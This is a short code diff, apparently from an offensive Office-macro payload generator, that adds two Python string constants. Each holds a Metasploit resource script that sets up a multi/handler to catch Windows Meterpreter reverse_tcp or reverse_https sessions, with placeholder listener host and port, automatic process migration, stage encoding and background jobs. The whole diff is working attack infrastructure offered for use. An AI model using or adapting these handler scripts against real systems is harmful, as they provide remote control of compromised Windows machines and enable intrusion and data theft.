@@ -307,6 +307,19 @@ End Sub
 """
 
 
+METERPRETER_RC =  \
+r"""
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <<<LHOST>>> 
+set LPORT <<<LPORT>>>
+set AutoRunScript post/windows/manage/migrate
+set EXITFUNC thread
+set ExitOnSession false
+set EnableUnicodeEncoding true
+set EnableStageEncoding true
+exploit -j
+"""
 
 WEBMETER =  \
 r"""
@@ -337,6 +350,20 @@ End Sub
 
 'Insert WebMeter from vbLib here
 
+"""
+
+WEBMETER_RC = \
+r"""
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST <<<LHOST>>> 
+set LPORT <<<LPORT>>>
+set AutoRunScript post/windows/manage/migrate
+set EXITFUNC thread
+set ExitOnSession false
+set EnableUnicodeEncoding true
+set EnableStageEncoding true
+exploit -j
 """
 
 
